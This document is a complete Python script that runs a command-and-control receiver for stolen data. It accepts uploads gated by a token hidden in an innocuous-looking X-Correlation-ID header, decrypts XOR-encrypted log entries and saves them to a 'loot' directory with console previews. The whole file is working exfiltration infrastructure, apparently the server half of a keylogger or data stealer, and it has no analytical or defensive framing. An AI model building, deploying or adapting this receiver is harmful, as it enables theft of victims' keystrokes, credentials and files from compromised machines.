#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import re
import sys
import time

PORT = 80
UPLOAD_DIR = "loot"
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
CACHE_HEADER_SIZE = 32
TOKEN_FILE = "auth_token.key"
ENDPOINT = "/l"

XOR_KEY = bytes([0x5A, 0x3C, 0x7F, 0x1B, 0xAE, 0xD2, 0x44, 0x91])

AUTH_TOKEN = None


def xor_crypt(data: bytes) -> bytes:
    out = bytearray(len(data))
    for i in range(len(data)):
        out[i] = data[i] ^ XOR_KEY[i % len(XOR_KEY)]
    return bytes(out)


def decrypt_log_file(raw_content: bytes) -> str:
    result = []

    if len(raw_content) <= CACHE_HEADER_SIZE:
        return "[EMPTY]"

    data = raw_content[CACHE_HEADER_SIZE:]
    offset = 0

    while offset + 2 <= len(data):
        entry_len = int.from_bytes(data[offset:offset + 2], 'little')
        offset += 2

        if entry_len == 0 or offset + entry_len > len(data):
            break

        encrypted = data[offset:offset + entry_len]
        decrypted = xor_crypt(encrypted)
        result.append(decrypted.decode('utf-8', errors='replace'))
        offset += entry_len

    return '\n'.join(result)


def parse_multipart(body: bytes, boundary: bytes):
    parts = body.split(b"--" + boundary)
    for part in parts:
        part = part.strip()
        if not part or part == b"--":
            continue
        sep = part.find(b"\r\n\r\n")
        if sep < 0:
            continue
        headers_raw = part[:sep].decode('utf-8', errors='replace')
        content = part[sep + 4:]
        if content.endswith(b"\r\n"):
            content = content[:-2]

        if 'name="file"' in headers_raw:
            filename = None
            match = re.search(r'filename="([^"]+)"', headers_raw)
            if match:
                filename = match.group(1)
            return content, filename
    return None, None


class FileUploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != ENDPOINT:
            self.send_response(404)
            self.end_headers()
            return

        req_token = self.headers.get('X-Correlation-ID', '')
        if AUTH_TOKEN and req_token != AUTH_TOKEN:
            print(f"[-] Auth failed from {self.client_address[0]} "
                  f"(got: {req_token[:8]}{'...' if len(req_token) > 8 else ''})")
            self.send_response(403)
            self.end_headers()
            return

        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > MAX_FILE_SIZE:
                print(f"[-] Oversized upload blocked: {self.client_address[0]}")
                self.send_response(413)
                self.end_headers()
                return

            content_type = self.headers.get('Content-Type', '')
            if 'multipart/form-data' not in content_type:
                self.send_response(400)
                self.end_headers()
                return

            boundary = None
            for param in content_type.split(';'):
                param = param.strip()
                if param.startswith('boundary='):
                    boundary = param[9:].strip().encode()
                    break

            if not boundary:
                self.send_response(400)
                self.end_headers()
                return

            body = self.rfile.read(content_length)
            file_content, upload_filename = parse_multipart(body, boundary)

            if file_content is None:
                self.send_response(400)
                self.end_headers()
                return

            timestamp = int(time.time())
            client_ip = self.client_address[0]

            if upload_filename and upload_filename.endswith('.log'):
                base = upload_filename[:-4]
            else:
                base = f"{client_ip}_{timestamp}"

            decrypted = decrypt_log_file(file_content)
            dec_name = f"log_{base}.txt"
            dec_path = os.path.join(UPLOAD_DIR, dec_name)
            with open(dec_path, "w") as f:
                f.write(decrypted)

            print(f"[+] Received from {client_ip}:")
            print(f"    Saved: {dec_name}")
            print(f"    --- Content Preview ---")
            for line in decrypted.split('\n')[:10]:
                print(f"    {line}")
            if decrypted.count('\n') > 10:
                print(f"    ... ({decrypted.count(chr(10))} total lines)")
            print(f"    -----------------------")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        except Exception as e:
            print(f"[-] Processing error: {e}")

        self.send_response(400)
        self.end_headers()

    def log_message(self, format, *args):
        pass


def main():
    global AUTH_TOKEN

    port = PORT
    token_file = TOKEN_FILE

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == '--port' and i + 1 < len(args):
            port = int(args[i + 1])
            i += 2
        elif args[i] == '--token-file' and i + 1 < len(args):
            token_file = args[i + 1]
            i += 2
        elif args[i] == '--endpoint' and i + 1 < len(args):
            global ENDPOINT
            ENDPOINT = args[i + 1]
            if not ENDPOINT.startswith('/'):
                ENDPOINT = '/' + ENDPOINT
            i += 2
        else:
            i += 1

    if os.path.exists(token_file):
        with open(token_file, "r") as f:
            AUTH_TOKEN = f.read().strip()
        print(f"[*] Auth token loaded from {token_file}")
    else:
        print(f"[!] WARNING: No token file found at {token_file}")
        print(f"[!] Running WITHOUT authentication - any client can upload")

    os.makedirs(UPLOAD_DIR, exist_ok=True)

    print(f"[*] C2 Receiver listening on port {port}")
    print(f"[*] Endpoint: POST {ENDPOINT}")
    print(f"[*] Auth: {'ENABLED' if AUTH_TOKEN else 'DISABLED'}")
    print(f"[*] Loot directory: {UPLOAD_DIR}/")
    print(f"[*] Decryption: ENABLED")
    print()

    server = HTTPServer(('0.0.0.0', port), FileUploadHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        server.server_close()


if __name__ == '__main__':
    main()
